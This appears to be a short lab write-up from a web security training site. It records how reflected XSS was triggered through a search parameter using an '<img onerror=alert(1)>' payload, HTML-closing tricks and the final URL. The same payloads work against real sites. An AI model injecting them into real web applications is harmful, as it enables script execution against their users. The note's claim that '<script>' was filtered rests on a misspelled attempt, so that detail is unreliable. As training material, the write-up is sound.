# Lab: Reflected XSS into HTML context with nothing encoded

🔗 **Lab URL**:  
https://0a130085045e67ba8032039b00c5004a.web-security-academy.net/?search=coffee

---

## 🎯 Goal  
Trigger a JavaScript alert via reflected XSS.

---

## 🧪 Steps  
1. Input reflected in HTML inside `<h1>`:  
   `<h1>0 search results for 'coffee">'</h1>`

2. Tried:
   ```
   coffee">
   coffee<scripr>alert(1)</script>      ❌ filtered
   coffee<img src=x onerror="alert(1)"> ✅ works
   ```

3. To fix broken HTML:
   ```
   coffee<img src=x onerror="alert(1)"></h1><!--
   ```

---

## ✅ Final Payload  
```html
<img src=x onerror="alert(1)">
```

Encoded in URL:  
`?search=coffee<img src=x onerror="alert(1)"></h1><!--`

---

## 🛠 Tools  
Browser only – no filters detected except blocking `<script>`.

---

## ✅ Status: Solved
